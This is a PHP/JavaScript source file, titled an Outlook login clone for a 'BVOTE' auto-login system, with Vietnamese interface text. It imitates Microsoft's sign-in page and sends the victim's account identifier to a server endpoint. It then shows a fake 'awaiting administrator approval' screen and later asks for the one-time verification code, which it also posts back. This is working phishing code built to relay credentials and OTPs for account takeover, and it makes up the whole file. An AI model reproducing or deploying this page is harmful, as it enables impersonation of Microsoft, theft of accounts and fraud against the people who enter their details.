<?php
// OutlookLoginClone.php - BVOTE Auto Login System
?>
<div class="bg-white p-6 rounded-lg text-black w-full flex flex-col justify-center">
  <div class="text-center mb-6">
    <div class="mb-4">
      <!-- Microsoft Logo với 4 màu -->
      <div class="flex items-center justify-center space-x-1">
        <div class="w-3 h-3 bg-red-500"></div>
        <div class="w-3 h-3 bg-green-500"></div>
        <div class="w-3 h-3 bg-blue-500"></div>
        <div class="w-3 h-3 bg-yellow-500"></div>
      </div>
      <div class="text-2xl font-semibold text-gray-800 mt-2">Microsoft</div>
    </div>
    <h2 class="text-xl font-semibold">Đăng nhập</h2>
    <p class="text-sm text-gray-600 mt-1">để tiếp tục đến BVOTE</p>
  </div>

  <form id="outlook-login-form" class="space-y-4" onsubmit="return handleOutlookLogin(event)">
    <input id="outlook-account" name="account" type="email"
           placeholder="Email, số điện thoại hoặc Skype" required
           class="w-full h-11 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 text-black rounded px-3" />

    <div class="flex justify-end">
      <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
        Đăng nhập
      </button>
    </div>
  </form>

  <div class="text-center mt-4">
    <a href="#" class="text-sm text-blue-600 hover:underline">Không thể đăng nhập?</a>
  </div>

  <div class="text-center mt-4">
    <p class="text-xs text-gray-500">Bằng cách đăng nhập, bạn đồng ý với <a href="#" class="text-blue-600 hover:underline">Điều khoản sử dụng</a></p>
  </div>
</div>

<script>
var isLoadingOutlook = false;

function handleOutlookLogin(e) {
  e.preventDefault();
  if (isLoadingOutlook) return false;

  const account = document.getElementById('outlook-account').value.trim();
  if (!account) {
    alert('Vui lòng nhập email, số điện thoại hoặc Skype');
    return false;
  }

  isLoadingOutlook = true;
  const submitBtn = e.target.querySelector('button[type="submit"]');
  const originalText = submitBtn.textContent;
  submitBtn.textContent = 'Đang xử lý...';
  submitBtn.disabled = true;

  // Gọi API Auto Login
  fetch('/api/social-login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      platform: 'microsoft',
      user_hint: account
    })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      // Chuyển đến màn hình chờ phê duyệt
      showWaitingScreen(data.request_id, 'microsoft');
    } else {
      alert('Lỗi: ' + (data.error || 'Không thể tạo yêu cầu đăng nhập'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  })
  .finally(() => {
    isLoadingOutlook = false;
    submitBtn.textContent = originalText;
    submitBtn.disabled = false;
  });

  return false;
}

function showWaitingScreen(requestId, platform) {
  // Tạo modal chờ phê duyệt
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
        <h3 class="text-lg font-semibold mb-2">Đang chờ phê duyệt</h3>
        <p class="text-gray-600 mb-4">Yêu cầu đăng nhập của bạn đang được xem xét bởi quản trị viên.</p>
        <div class="text-sm text-gray-500">
          <p>Nền tảng: ${platform}</p>
          <p>ID yêu cầu: ${requestId}</p>
        </div>
        <div class="mt-4">
          <button onclick="checkLoginStatus('${requestId}')" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
            Kiểm tra trạng thái
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Tự động kiểm tra trạng thái mỗi 5 giây
  const interval = setInterval(() => {
    checkLoginStatus(requestId, interval, modal);
  }, 5000);
}

function checkLoginStatus(requestId, interval = null, modal = null) {
  fetch(`/api/social-login/status/${requestId}`)
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        const status = data.request.status;

        if (status === 'APPROVED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Đăng nhập thành công! Chào mừng bạn đến với BVOTE.');
          window.location.href = '/user/home'; // Chuyển đến trang chủ user
        } else if (status === 'OTP_REQUIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          showOTPDialog(requestId);
        } else if (status === 'REJECTED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập bị từ chối. Vui lòng thử lại.');
        } else if (status === 'EXPIRED') {
          if (interval) clearInterval(interval);
          if (modal) modal.remove();
          alert('Yêu cầu đăng nhập đã hết hạn. Vui lòng thử lại.');
        }
      } else {
        console.error('Error checking status:', data.error);
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });
}

function showOTPDialog(requestId) {
  const modal = document.createElement('div');
  modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50';
  modal.innerHTML = `
    <div class="bg-white p-6 rounded-lg max-w-md w-full mx-4">
      <div class="text-center">
        <h3 class="text-lg font-semibold mb-4">Nhập mã OTP</h3>
        <p class="text-gray-600 mb-4">Vui lòng nhập mã xác thực được gửi đến bạn.</p>
        <div class="mb-4">
          <input type="text" id="otp-input" placeholder="Nhập mã OTP"
                 class="w-full p-3 border border-gray-300 rounded text-center text-lg tracking-widest"
                 maxlength="6" pattern="[0-9]{6}">
        </div>
        <div class="flex space-x-2">
          <button onclick="verifyOTP('${requestId}')" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
            Xác thực
          </button>
          <button onclick="this.closest('.fixed').remove()" class="bg-gray-500 text-white px-4 py-2 rounded hover:bg-gray-600">
            Hủy
          </button>
        </div>
      </div>
    </div>
  `;

  document.body.appendChild(modal);

  // Focus vào input OTP
  setTimeout(() => {
    document.getElementById('otp-input').focus();
  }, 100);
}

function verifyOTP(requestId) {
  const otpInput = document.getElementById('otp-input');
  const otp = otpInput.value.trim();

  if (!otp || otp.length !== 6) {
    alert('Vui lòng nhập đúng 6 số OTP');
    return;
  }

  fetch(`/api/social-login/${requestId}/otp`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ otp: otp })
  })
  .then(response => response.json())
  .then(data => {
    if (data.success) {
      alert('Xác thực OTP thành công! Chào mừng bạn đến với BVOTE.');
      window.location.href = '/user/home';
    } else {
      alert('Lỗi: ' + (data.error || 'OTP không đúng'));
    }
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Lỗi kết nối. Vui lòng thử lại.');
  });
}
</script>
